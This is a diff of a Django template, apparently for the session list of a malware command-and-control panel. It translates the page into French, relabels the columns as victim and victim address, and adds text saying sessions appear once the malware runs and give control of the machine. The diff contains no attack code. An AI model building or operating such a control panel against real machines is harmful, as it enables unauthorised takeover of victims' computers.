@@ -1,20 +1,25 @@
 {% extends "base.html" %}
 {% block title %}Sessions{% endblock %}
 {% block content %}
-    <h2>Active sessions </h2>
+    <h2>Sessions</h2>
     <hr/>
 
+
+    <p>
+        Chaque session représente un canal de communication avec une machine sur laquelle vous pouvez prendre le contrôle.
+    </p>
+
     {% if sessions_nbr == 0 %}
-        No active session yet.
+        Vous n'avez pas de session disponible. Si vous avez mis en place un gestionnaire, une session apparaîtra lorsque le logiciel malveillant sera exécuté. Sinon, <a href="{% url "init" %}">créez un gestionnaire</a>.
     {% else %}
         <table class="table table-hover mt-5">
             <thead class="thead-light">
                 <tr >
                     <th scope="col">#</th>
-                    <th scope="col">Target PC</th>
-                    <th scope="col">Target IPv6</th>
-                    <th scope="col">Local tunnel</th>
-                    <th scope="col">Peer tunnel</th>
+                    <th scope="col">Victime</th>
+                    <th scope="col">Adresse victime</th>
+                    <th scope="col">Tunnel local</th>
+                    <th scope="col">Tunnel distant</th>
                     <th scope="col"></th>
                 </tr>
             </thead>
